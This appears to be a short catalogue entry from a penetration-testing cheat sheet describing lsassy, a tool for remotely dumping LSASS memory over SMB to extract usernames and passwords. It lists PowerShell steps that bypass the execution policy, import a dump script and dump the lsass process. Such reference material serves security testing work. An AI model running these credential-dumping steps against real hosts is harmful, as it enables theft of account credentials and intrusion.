---
title: |
  Extract Credentials Remotely (RunDLL)
description: |
  Python tool to remotely extract credentials on a set of hosts. This tool uses impacket project to remotely read necessary bytes in lsass dump and pypykatz to extract credentials.

  Commands:

  	1. Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

  	2. Import-Module .\dump.ps1

  	3. Get-Process lsass | Out-Xdump

command: |
  See commands
items:
  - Username
  - Password
services:
  - SMB
OS:
  - Linux
attack_types:
  - Enumeration
references:
  - https://github.com/Hackndo/lsassy
  - https://en.hackndo.com/remote-lsass-dump-passwords/
---
